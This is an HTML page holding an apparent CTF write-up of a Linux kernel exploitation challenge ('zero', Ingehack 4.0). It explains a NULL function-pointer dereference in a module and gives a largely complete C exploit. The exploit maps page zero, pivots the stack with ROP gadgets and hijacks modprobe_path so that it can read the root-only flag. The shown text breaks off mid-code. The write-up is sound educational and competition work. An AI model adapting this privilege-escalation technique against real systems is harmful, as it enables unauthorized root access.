@@ -1,0 +1,365 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Liste - https://nothoudaifa.github.io/">
+    <title>zero chall writeup from ingehack 4.0 | nothoudaifa</title>
+    <meta name="description" content="I talk about computer stuff.">
+    <meta property="og:title" content="zero chall writeup from ingehack 4.0" />
+<meta property="og:description" content="challenge author: itskarudo points: 469 desc: translation services are so slow, i want a zero latency translator for all my important business, so i made one myself, right in the kernel. this is a kernel exploitation challenge, we are given three files run.sh, initramfs.cpio.gz, bzImage.
+looking at run.sh:
+#!/bin/sh  qemu-system-x86_64 \  -m 128M \  -nographic \  -kernel &#34;./bzImage&#34; \  -append &#34;console=ttyS0 quiet loglevel=3 pti=on nokaslr&#34; \  -monitor /dev/null \  -initrd &#34;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nothoudaifa.github.io/posts/ingehack-zero/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2025-02-26T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-02-26T00:00:00+00:00" />
+
+
+    <meta itemprop="name" content="zero chall writeup from ingehack 4.0">
+<meta itemprop="description" content="challenge author: itskarudo points: 469 desc: translation services are so slow, i want a zero latency translator for all my important business, so i made one myself, right in the kernel. this is a kernel exploitation challenge, we are given three files run.sh, initramfs.cpio.gz, bzImage.
+looking at run.sh:
+#!/bin/sh  qemu-system-x86_64 \  -m 128M \  -nographic \  -kernel &#34;./bzImage&#34; \  -append &#34;console=ttyS0 quiet loglevel=3 pti=on nokaslr&#34; \  -monitor /dev/null \  -initrd &#34;."><meta itemprop="datePublished" content="2025-02-26T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2025-02-26T00:00:00+00:00" />
+<meta itemprop="wordCount" content="901">
+<meta itemprop="keywords" content="ctf,pwn," />
+    
+    <link rel="canonical" href="https://nothoudaifa.github.io/posts/ingehack-zero/">
+    <link rel="icon" href="https://nothoudaifa.github.io//assets/favicon.ico">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link href="https://www.google-analytics.com" rel="preconnect" crossorigin>
+    <link rel="alternate" type="application/atom+xml" title="nothoudaifa" href="https://nothoudaifa.github.io//atom.xml" />
+    <link rel="alternate" type="application/json" title="nothoudaifa" href="https://nothoudaifa.github.io//feed.json" />
+    <link rel="shortcut icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Bricolage+Grotesque">
+    
+    
+    <style>*,:after,:before{box-sizing:border-box;padding:0}body{font:1rem/1.5 bricolage grotesque,-apple-system,BlinkMacSystemFont,segoe ui,Helvetica,Arial,sans-serif;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;padding:2rem;background:#fffdfa;color:#000}.skip-link{position:absolute;top:-40px;left:0;background:#eee;z-index:100}.skip-link:focus{top:0}header{line-height:2;padding-bottom:1.5rem}.link{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-decoration:none}.time{font-variant-numeric:tabular-nums;white-space:nowrap}blockquote{border-left:5px solid #eee;padding-left:1rem;margin:0}a,a:visited{color:inherit}a:hover,a.heading-link{text-decoration:none}pre{padding:.5rem;overflow:auto;overflow-x:scroll;overflow-wrap:normal}code,pre{font-family:San Francisco Mono,Monaco,consolas,lucida console,dejavu sans mono,bitstream vera sans mono,monospace;font-size:normal;font-size:small;background:#eee}code{margin:.1rem;border:none;overflow:visible;overflow-wrap:anywhere}ul{list-style-type:square}ul,ol{padding-left:1.2rem}.list{line-height:2;list-style-type:none;padding-left:0}.list li{padding-bottom:.1rem}.meta{color:#777}.content{max-width:70ch;margin:0 auto}header{line-height:2;display:flex;justify-content:space-between;padding-bottom:1rem}header a{text-decoration:none}header ul{list-style-type:none;padding:0}header li,header a{display:inline}h2.post{padding-top:.5rem}header ul a:first-child{padding-left:1rem}.nav{height:1px;background:#000;content:'';max-width:10%}.list li{display:flex;align-items:baseline}.list li time{flex:initial}.hr-list{margin-top:0;margin-bottom:0;margin-right:.5rem;margin-left:.5rem;height:1px;border:0;border-bottom:1px dotted #ccc;flex:1 0 1rem}.m,hr{border:0;margin:3rem 0}img{max-width:100%;height:auto}.post-date{margin:5% 0}.index-date{color:#9a9a9a}.animate-blink{animation:opacity 1s infinite;opacity:1}@keyframes opacity{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}.tags{display:flex;justify-content:space-between}.tags ul{padding:0;margin:0}.tags li{display:inline}.avatar{height:120px;width:120px;position:relative;margin:-10px 0 0 15px;float:right;border-radius:50%}table{width:100%;border-collapse:collapse}th,td{border:1px solid #ddd;text-align:left;padding:8px}th{background-color:#f2f2f2} </style>
+  
+    
+  
+  
+  <script type="application/ld+json">
+  {
+      "@context": "http://schema.org",
+      "@type": "BlogPosting",
+      "articleSection": "posts",
+      "name": "zero chall writeup from ingehack 4.0",
+      "headline": "zero chall writeup from ingehack 4.0",
+      "alternativeHeadline": "",
+      "description": "challenge author: itskarudo points: 469 desc: translation services are so slow, i want a zero latency translator for all my important business, so i made one myself, right in the kernel. this is a kernel exploitation challenge, we are given three files run.sh, initramfs.cpio.gz, bzImage.\nlooking at run.sh:\n#!\/bin\/sh  qemu-system-x86_64 \\  -m 128M \\  -nographic \\  -kernel \u0026#34;.\/bzImage\u0026#34; \\  -append \u0026#34;console=ttyS0 quiet loglevel=3 pti=on nokaslr\u0026#34; \\  -monitor \/dev\/null \\  -initrd \u0026#34;.",
+      "inLanguage": "en-us",
+      "isFamilyFriendly": "true",
+      "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https:\/\/nothoudaifa.github.io\/posts\/ingehack-zero\/"
+      },
+      "author" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "creator" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "accountablePerson" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "copyrightHolder" : "nothoudaifa",
+      "copyrightYear" : "2025",
+      "dateCreated": "2025-02-26T00:00:00.00Z",
+      "datePublished": "2025-02-26T00:00:00.00Z",
+      "dateModified": "2025-02-26T00:00:00.00Z",
+      "publisher":{
+          "@type":"Organization",
+          "name": "nothoudaifa",
+          "url": "https://nothoudaifa.github.io/",
+          "logo": {
+              "@type": "ImageObject",
+              "url": "https:\/\/nothoudaifa.github.io\/assets\/favicon.ico",
+              "width":"32",
+              "height":"32"
+          }
+      },
+      "image": "https://nothoudaifa.github.io/assets/favicon.ico",
+      "url" : "https:\/\/nothoudaifa.github.io\/posts\/ingehack-zero\/",
+      "wordCount" : "901",
+      "genre" : [ "ctf" , "pwn" ],
+      "keywords" : [ "ctf" , "pwn" ]
+  }
+  </script>
+  
+  
+  </head>
+
+<body>
+  <a class="skip-link" href="#main">Skip to main</a>
+  <main id="main">
+  <div class="content">
+    <header>
+<p style="padding: 0;margin: 0;">
+  <a href="https://nothoudaifa.github.io/">
+    <b>nothoudaifa</b>
+    <span class="text-stone-500 animate-blink">▮</span>
+  </a>
+</p>
+<ul style="padding: 0;margin: 0;">
+  
+  
+  <li class="">
+    <a href="/posts/"><span>Posts</span></a>
+    
+  <li class="">
+    <a href="/about/"><span>About</span></a>
+    
+  </li>
+</ul>
+</header>
+<hr class="hr-list" style="padding: 0;margin: 0;">
+    <section>
+      <h2 class="post">zero chall writeup from ingehack 4.0</h2>
+      <div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#75af00">challenge</span> <span style="color:#75af00">author</span><span style="color:#f92672">:</span> <span style="color:#75af00">itskarudo</span>
+<span style="color:#75af00">points</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">469</span>
+<span style="color:#75af00">desc</span><span style="color:#f92672">:</span> <span style="color:#75af00">translation</span> <span style="color:#75af00">services</span> <span style="color:#75af00">are</span> <span style="color:#75af00">so</span> <span style="color:#75af00">slow</span><span style="color:#111">,</span> <span style="color:#75af00">i</span> <span style="color:#75af00">want</span> <span style="color:#75af00">a</span> <span style="color:#75af00">zero</span> <span style="color:#75af00">latency</span> <span style="color:#75af00">translator</span> 
+<span style="color:#00a8c8">for</span> <span style="color:#75af00">all</span> <span style="color:#75af00">my</span> <span style="color:#75af00">important</span> <span style="color:#75af00">business</span><span style="color:#111">,</span> <span style="color:#75af00">so</span> <span style="color:#75af00">i</span> <span style="color:#75af00">made</span> <span style="color:#75af00">one</span> <span style="color:#75af00">myself</span><span style="color:#111">,</span> <span style="color:#75af00">right</span> <span style="color:#00a8c8">in</span> <span style="color:#75af00">the</span> 
+<span style="color:#75af00">kernel</span><span style="color:#111">.</span>
+</code></pre></div><p>this is a kernel exploitation challenge, we are given three files run.sh, initramfs.cpio.gz, bzImage.</p>
+<p>looking at run.sh:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
+</span><span style="color:#75715e"></span>
+qemu-system-x86_64 <span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>    -m 128M <span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>    -nographic <span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>    -kernel <span style="color:#d88200">&#34;./bzImage&#34;</span> <span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>    -append <span style="color:#d88200">&#34;console=ttyS0 quiet loglevel=3 pti=on nokaslr&#34;</span> <span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>    -monitor /dev/null <span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>    -initrd <span style="color:#d88200">&#34;./initramfs.cpio.gz&#34;</span> <span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>    -cpu qemu64,+smep <span style="color:#8045ff">\
+</span><span style="color:#8045ff"></span>    -smp <span style="color:#111">cores</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+</code></pre></div><p>we can see that kaslr is not activated and only <a href="https://en.wikipedia.org/wiki/Control_register#SMEP">smep</a> is on.</p>
+<p>after extracting initramfs.cpio.gz it has:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bin  chal.ko  dev  etc  exploit  home  init  linuxrc  mnt  proc  root  sbin  sys  usr  var
+</code></pre></div><p>there are two important files.</p>
+<p>init:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
+</span><span style="color:#75715e"></span>
+hostname zero
+
+chown -R root:root /
+chmod <span style="color:#ae81ff">0700</span> /root
+chown -R user:user /home/user
+
+mount -t proc none /proc
+mount -t sysfs none /sys
+mount -t devpts -o <span style="color:#111">gid</span><span style="color:#f92672">=</span>5,mode<span style="color:#f92672">=</span><span style="color:#ae81ff">0620</span> devpts /dev/pts
+mount -t devtmpfs -o nosuid,mode<span style="color:#f92672">=</span><span style="color:#ae81ff">0755</span> udev /dev
+
+chmod <span style="color:#ae81ff">0400</span> /root/flag
+
+insmod /chal.ko
+chmod <span style="color:#ae81ff">666</span> /dev/chal
+
+<span style="color:#111">echo</span> <span style="color:#ae81ff">0</span> &gt; /proc/sys/vm/mmap_min_addr
+
+setsid cttyhack setuidgid <span style="color:#ae81ff">1000</span> /bin/sh
+
+umount /proc <span style="color:#f92672">&amp;&amp;</span> umount /sys
+poweroff -d <span style="color:#ae81ff">0</span> -f
+</code></pre></div><p>we can see that it loads chall.ko and runs:
+<code>echo 0 &gt; /proc/sys/vm/mmap_min_addr</code> this <a href="https://wiki.debian.org/mmap_min_addr">command</a> make it possible to mmap a page with a virtual address of 0x0 (this will become important later).</p>
+<p>now looking into chall.ko using ghidra we see that it uses an ioctl interface to communicate with userland.</p>
+<p><img
+  src="/images/Screenshot_from_2025-02-23_10-56-06.png"
+  alt="Screenshot from 2025-02-23 10-56-06.png"
+  loading="lazy"
+  decoding="async"
+  class="full-width"
+/>
+
+</p>
+<p>this ioctl handler calls functions stored in g_handler (it’s an array of functions).</p>
+<p>in zero_open (called when you open the kernel module) we can see that it sets g_handler to lang_table.</p>
+<p><img
+  src="/images/Screenshot_from_2025-02-23_11-11-13.png"
+  alt="Screenshot from 2025-02-23 11-11-13.png"
+  loading="lazy"
+  decoding="async"
+  class="full-width"
+/>
+
+</p>
+<p>In zero_release (called when you close the kernel module) it sets g_handler to 0x0.</p>
+<p><img
+  src="/images/Screenshot_from_2025-02-23_11-13-25.png"
+  alt="Screenshot from 2025-02-23 11-13-25.png"
+  loading="lazy"
+  decoding="async"
+  class="full-width"
+/>
+
+</p>
+<h2 id="the-vulnerability">The vulnerability:</h2>
+<p>g_handler is a global variable, meaning it persists when you call open,ioctl,close.</p>
+<p>the vulnerability appears when we open two file devices then close one of them, making g_handler == 0x0, but we can still try to use it as a function pointer in zero_ioctl, which will make this a <a href="https://security.stackexchange.com/questions/270612/null-dereference-why-does-it-work">kernel null byte deference vulnerability</a>.</p>
+<p>to trigger it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#00a8c8">int</span> <span style="color:#111">fd1</span> <span style="color:#f92672">=</span> <span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/dev/chal&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x2</span><span style="color:#111">);</span>
+<span style="color:#00a8c8">int</span> <span style="color:#111">fd2</span> <span style="color:#f92672">=</span> <span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/dev/chal&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x2</span><span style="color:#111">);</span> <span style="color:#75715e">// g_hanler is now equal to lang_table
+</span><span style="color:#75715e"></span><span style="color:#111">close</span><span style="color:#111">(</span><span style="color:#111">fd1</span><span style="color:#111">);</span> <span style="color:#75715e">// g_handler == 0x0
+</span><span style="color:#75715e"></span><span style="color:#111">ioctl</span><span style="color:#111">(</span><span style="color:#111">fd1</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x1</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x0</span><span style="color:#111">);</span> <span style="color:#75715e">// this will derefrence g_handler (which is 0x0) and jmp to that address. 
+</span></code></pre></div><h2 id="exploitation">Exploitation:</h2>
+<p>normally, exploiting this would be impossible because of two reasons (both of them are disabled):</p>
+<ul>
+<li>mmap_min_addr: mmap_min_addr is always &gt; 0 (it’s 0x10000 on my machine). which means that userland processes can not map a page into 0x0 address preventing the kernel null byte deference. but in this chall it’s set to 0 by <code>echo 0 &gt; /proc/sys/vm/mmap_min_addr</code> .</li>
+<li>smap: prevents the kernel from accessing userland memory.</li>
+</ul>
+<p>so now if we mmap a page at 0x0 and cause the vulnerability we should be able to direct execution anywhere we want by writing the desired address at 0x0.</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"> <span style="color:#00a8c8">char</span><span style="color:#f92672">*</span> <span style="color:#111">addr</span> <span style="color:#f92672">=</span> <span style="color:#111">mmap</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x1000</span><span style="color:#111">,</span> <span style="color:#111">PROT_READ</span><span style="color:#f92672">|</span><span style="color:#111">PROT_WRITE</span><span style="color:#f92672">|</span><span style="color:#111">PROT_EXEC</span><span style="color:#111">,</span> <span style="color:#111">MAP_PRIVATE</span> <span style="color:#f92672">|</span> <span style="color:#111">MAP_ANONYMOUS</span> <span style="color:#f92672">|</span> <span style="color:#111">MAP_FIXED</span><span style="color:#111">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x0</span><span style="color:#111">);</span>
+ <span style="color:#75715e">// MAP_FIXED is required so it would map the page to 0x0.
+</span><span style="color:#75715e"></span> <span style="color:#f92672">*</span><span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span><span style="color:#f92672">*</span><span style="color:#111">)</span><span style="color:#ae81ff">0x0</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0x41414141</span><span style="color:#111">;</span>
+ 
+<span style="color:#00a8c8">int</span> <span style="color:#111">fd1</span> <span style="color:#f92672">=</span> <span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/dev/chal&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x2</span><span style="color:#111">);</span>
+<span style="color:#00a8c8">int</span> <span style="color:#111">fd2</span> <span style="color:#f92672">=</span> <span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/dev/chal&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x2</span><span style="color:#111">);</span>
+<span style="color:#111">close</span><span style="color:#111">(</span><span style="color:#111">fd1</span><span style="color:#111">);</span>
+<span style="color:#111">ioctl</span><span style="color:#111">(</span><span style="color:#111">fd1</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x1</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x0</span><span style="color:#111">);</span>
+</code></pre></div><p>by running this, we get:</p>
+<p><img
+  src="/images/Screenshot_from_2025-02-23_11-41-40.png"
+  alt="Screenshot from 2025-02-23 11-41-40.png"
+  loading="lazy"
+  decoding="async"
+  class="full-width"
+/>
+
+</p>
+<p>you can see that it faulted at 0x41414141</p>
+<p>since smap is disabled we will simply make a rop chain (kaslr is disabled, no need for leak) in userland memory and pivot to it (this surprisingly took a long time to do).</p>
+<p>the gadget i chose is: <code>0xffffffff81037fbf: mov esp, 0x39e8825b; ret</code></p>
+<p>i used <a href="https://github.com/zolutal/kropr">kropr</a> to search for this gadget, because ROPGadget gave me gadgets from non executable memory.</p>
+<p>after this, i mmap’ed <code>0x39e88000</code> and wrote my rop chain in there.</p>
+<p>the rop chain overwrites modprobe path to point to <code>/home/user/pwnaa</code> .</p>
+<p>here is the final exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>       <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/ioctl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#00a8c8">void</span> <span style="color:#75af00">sigsegv_handler</span><span style="color:#111">(</span><span style="color:#00a8c8">int</span> <span style="color:#111">sig</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+    <span style="color:#111">puts</span><span style="color:#111">(</span><span style="color:#d88200">&#34;[*] Returned to userland, setting up for fake modprobe&#34;</span><span style="color:#111">);</span>
+    
+    <span style="color:#111">system</span><span style="color:#111">(</span><span style="color:#d88200">&#34;echo &#39;#!/bin/sh</span><span style="color:#8045ff">\n</span><span style="color:#d88200">cp /root/flag /home/user/flag</span><span style="color:#8045ff">\n</span><span style="color:#d88200">chmod 777 /home/user/flag&#39; &gt; /home/user/pwnaa&#34;</span><span style="color:#111">);</span>
+    <span style="color:#111">system</span><span style="color:#111">(</span><span style="color:#d88200">&#34;chmod +x /home/user/pwnaa&#34;</span><span style="color:#111">);</span>
+
+    <span style="color:#111">system</span><span style="color:#111">(</span><span style="color:#d88200">&#34;echo -ne &#39;</span><span style="color:#8045ff">\\</span><span style="color:#d88200">xff</span><span style="color:#8045ff">\\</span><span style="color:#d88200">xff</span><span style="color:#8045ff">\\</span><span style="color:#d88200">xff</span><span style="color:#8045ff">\\</span><span style="color:#d88200">xff&#39; &gt; /home/user/dummy&#34;</span><span style="color:#111">);</span>
+    <span style="color:#111">system</span><span style="color:#111">(</span><span style="color:#d88200">&#34;chmod +x /home/user/dummy&#34;</span><span style="color:#111">);</span>
+
+    <span style="color:#111">puts</span><span style="color:#111">(</span><span style="color:#d88200">&#34;[*] Run unknown file&#34;</span><span style="color:#111">);</span>
+    <span style="color:#111">system</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/home/user/dummy&#34;</span><span style="color:#111">);</span>
+
+    <span style="color:#111">puts</span><span style="color:#111">(</span><span style="color:#d88200">&#34;[*] Hopefully flag is readable&#34;</span><span style="color:#111">);</span>
+    <span style="color:#111">system</span><span style="color:#111">(</span><span style="color:#d88200">&#34;cat /home/user/flag&#34;</span><span style="color:#111">);</span>
+
+    <span style="color:#111">exit</span><span style="color:#111">(</span><span style="color:#ae81ff">0</span><span style="color:#111">);</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span> <span style="color:#111">user_cs</span><span style="color:#111">,</span> <span style="color:#111">user_ss</span><span style="color:#111">,</span> <span style="color:#111">user_rflags</span><span style="color:#111">,</span> <span style="color:#111">user_sp</span><span style="color:#111">;</span>
+
+<span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span> <span style="color:#111">user_rip</span> <span style="color:#f92672">=</span> <span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span><span style="color:#111">)</span><span style="color:#111">sigsegv_handler</span><span style="color:#111">;</span>
+
+<span style="color:#00a8c8">void</span> <span style="color:#75af00">save_state</span><span style="color:#111">(){</span>
+    <span style="color:#111">__asm__</span><span style="color:#111">(</span>
+        <span style="color:#d88200">&#34;.intel_syntax noprefix;&#34;</span>
+        <span style="color:#d88200">&#34;mov user_cs, cs;&#34;</span>
+        <span style="color:#d88200">&#34;mov user_ss, ss;&#34;</span>
+        <span style="color:#d88200">&#34;mov user_sp, rsp;&#34;</span>
+        <span style="color:#d88200">&#34;pushf;&#34;</span>
+        <span style="color:#d88200">&#34;pop user_rflags;&#34;</span>
+        <span style="color:#d88200">&#34;.att_syntax;&#34;</span>
+    <span style="color:#111">);</span>
+    <span style="color:#111">puts</span><span style="color:#111">(</span><span style="color:#d88200">&#34;[*] Saved state&#34;</span><span style="color:#111">);</span>
+<span style="color:#111">}</span>
+
+<span style="color:#00a8c8">int</span> <span style="color:#75af00">main</span> <span style="color:#111">(</span><span style="color:#00a8c8">int</span> <span style="color:#111">argc</span><span style="color:#111">,</span> <span style="color:#00a8c8">char</span><span style="color:#f92672">*</span> <span style="color:#111">argv</span><span style="color:#111">[])</span> <span style="color:#111">{</span>
+    <span style="color:#111">signal</span><span style="color:#111">(</span><span style="color:#111">SIGSEGV</span><span style="color:#111">,</span> <span style="color:#111">sigsegv_handler</span><span style="color:#111">);</span>
+
+    <span style="color:#00a8c8">char</span><span style="color:#f92672">*</span> <span style="color:#111">addr2</span> <span style="color:#f92672">=</span> <span style="color:#111">mmap</span><span style="color:#111">((</span><span style="color:#00a8c8">void</span><span style="color:#f92672">*</span><span style="color:#111">)</span><span style="color:#ae81ff">0x39e88000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0xc000</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x10000</span><span style="color:#111">,</span> <span style="color:#111">PROT_READ</span><span style="color:#f92672">|</span><span style="color:#111">PROT_WRITE</span><span style="color:#f92672">|</span><span style="color:#111">PROT_EXEC</span><span style="color:#111">,</span> <span style="color:#111">MAP_PRIVATE</span> <span style="color:#f92672">|</span> <span style="color:#111">MAP_ANONYMOUS</span> <span style="color:#f92672">|</span> <span style="color:#111">MAP_FIXED</span><span style="color:#111">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x0</span> <span style="color:#111">);</span>
+    <span style="color:#00a8c8">char</span><span style="color:#f92672">*</span> <span style="color:#111">addr</span> <span style="color:#f92672">=</span> <span style="color:#111">mmap</span><span style="color:#111">(</span><span style="color:#ae81ff">0x0</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x1000</span><span style="color:#111">,</span> <span style="color:#111">PROT_READ</span><span style="color:#f92672">|</span><span style="color:#111">PROT_WRITE</span><span style="color:#f92672">|</span><span style="color:#111">PROT_EXEC</span><span style="color:#111">,</span> <span style="color:#111">MAP_PRIVATE</span> <span style="color:#f92672">|</span> <span style="color:#111">MAP_ANONYMOUS</span> <span style="color:#f92672">|</span> <span style="color:#111">MAP_FIXED</span><span style="color:#111">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x0</span><span style="color:#111">);</span>
+
+    
+    <span style="color:#f92672">*</span><span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span><span style="color:#f92672">*</span><span style="color:#111">)</span><span style="color:#ae81ff">0x0</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0xffffffff81037fbf</span><span style="color:#111">;</span> <span style="color:#75715e">//0xffffffff81037fbf: mov esp, 0x39e8825b; ret;
+</span><span style="color:#75715e"></span>
+    <span style="color:#00a8c8">int</span> <span style="color:#111">fd1</span> <span style="color:#f92672">=</span> <span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/dev/chal&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x2</span><span style="color:#111">);</span>
+    <span style="color:#00a8c8">int</span> <span style="color:#111">fd2</span> <span style="color:#f92672">=</span> <span style="color:#111">open</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/dev/chal&#34;</span><span style="color:#111">,</span> <span style="color:#ae81ff">0x2</span><span style="color:#111">);</span>
+
+    <span style="color:#111">assert</span><span style="color:#111">(</span><span style="color:#111">fd1</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">);</span>
+    <span style="color:#111">assert</span><span style="color:#111">(</span><span style="color:#111">fd2</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#111">);</span>
+
+    <span style="color:#111">close</span><span style="color:#111">(</span><span style="color:#111">fd2</span><span style="color:#111">);</span>
+    
+    <span style="color:#111">save_state</span><span style="color:#111">();</span>
+
+    <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span><span style="color:#f92672">*</span> <span style="color:#111">arr</span> <span style="color:#f92672">=</span> <span style="color:#111">(</span><span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span><span style="color:#f92672">*</span><span style="color:#111">)</span><span style="color:#ae81ff">0x39e8825b</span><span style="color:#111">;</span>
+
+    <span style="color:#75715e">// gadgets:
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// 0xffffffff813089e2: mov qword ptr [rsi], rcx ; add bl, ch ; ret
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// 0xffffffff81ae90ce: pop rsi; ret 
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// 0x61616e77702f7265: pop rcx; ret
+</span><span style="color:#75715e"></span>
+    <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span> <span style="color:#111">modprobe</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff82ed18c0</span> <span style="color:#111">;</span>
+    <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span> <span style="color:#111">kpti_trampoline</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff81e0191e</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span> <span style="color:#111">poprsi</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff81ae90ce</span><span style="color:#111">;</span>
+    <span style="color:#00a8c8">unsigned</span> <span style="color:#00a8c8">long</span> <span style="color:#111">poprcx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff81d08613</span><span style="color:#111">;</span>
